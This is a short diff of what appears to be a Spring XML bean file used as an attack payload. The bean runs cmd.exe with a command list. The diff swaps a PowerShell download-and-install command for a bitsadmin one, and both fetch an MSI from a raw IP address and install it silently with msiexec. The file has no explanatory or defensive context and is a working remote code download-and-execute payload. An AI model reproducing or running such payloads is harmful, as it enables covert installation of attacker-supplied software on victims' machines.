@@ -4,7 +4,7 @@
             <list>
                 <value>cmd.exe</value>
                 <value>/c</value>
-                <value>powershell -Command "$p='C:\Users\Public\setup.msi'; try { Invoke-WebRequest -Uri 'http://151.247.22.37/sc/new.msi' -OutFile $p -ErrorAction Stop; if (Test-Path $p) { Start-Process msiexec.exe -ArgumentList '/i', $p, '/qn', '/norestart' -Wait; echo 'Success' } } catch { Write-Host 'Error: ' $_.Exception.Message }"</value>
+                <value>bitsadmin /transfer JobDown /download /priority normal http://151.247.22.37/sc/new.msi C:\Users\Public\setup.msi &amp;&amp; msiexec.exe /i C:\Users\Public\setup.msi /qn /norestart</value>
             </list>
         </constructor-arg>
     </bean>
